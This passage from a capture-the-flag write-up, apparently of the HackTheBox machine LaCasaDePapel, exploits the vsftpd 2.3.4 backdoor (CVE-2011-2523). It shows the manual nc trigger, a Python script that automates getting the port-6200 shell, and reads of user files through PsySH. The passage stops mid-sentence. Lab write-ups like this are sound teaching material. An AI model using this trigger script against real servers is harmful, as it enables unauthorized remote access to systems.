Finding with searchsploit the version of the ftp running we found found **[this exploit](https://www.exploit-db.com/exploits/49757)**. This is to exploit CVE-2011-2523 vulnerability for vsftpd 2.3.4, which contains a backdoor which opens a shell on port 6200/tcp.

We don't need to use the exploit, we can do it manually. Open a ftp session with nc specifying a user ending in `:)` and a random password, then connect to the `6200` port

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/LaCasaDePapel-10.10.10.131]
└─$ nc 10.10.10.131 21
220 (vsFTPd 2.3.4)
USER test:)
331 Please specify the password.
PASS testing

------------

┌──(kali㉿kali)-[~]
└─$ nc 10.10.10.131 6200 
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
help
  help       Show a list of commands. Type `help [foo]` for information about 
...[SNIP]...
```

And we got an interactive shell, which seems to be **[PsySH](https://psysh.org/)**. We write a script to automate this process:

```python
#!/usr/bin/env python3

import socket
import subprocess
import sys
import time

if len(sys.argv) < 2:
    print(f"{sys.argv[0]} [ip] [port = 21]")
    print("port defaults to 21 if not given")
    sys.exit()
elif len(sys.argv) == 2:
    port = 21
else:
    port = int(sys.argv[2])
target = sys.argv[1]

print(f"[*] Connecting to {target}:{port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(b'USER 0xdf:)\n')
s.send(b'PASS 0xdf\n')
time.sleep(2)
s.close()
print('[+] Backdoor triggered')
print('[*] Connecting')

try:
    sh = subprocess.Popen(f"nc {target} 6200", shell=True)
    sh.poll()
    sh.wait()
except KeyboardInterrupt:
    print("[!] Exiting Shell")
```

Inside PsySH we can't execute os commands, but we can use `scandir` `file_get_contents` and `readfile` functions.

```bash
scandir("/home")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
scandir("/home/berlin")
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
file_get_contents("/home/berlin/user.txt")
PHP Warning:  file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
```

Now, going back to the HTTP service we try to generate an email with the token provided with the qr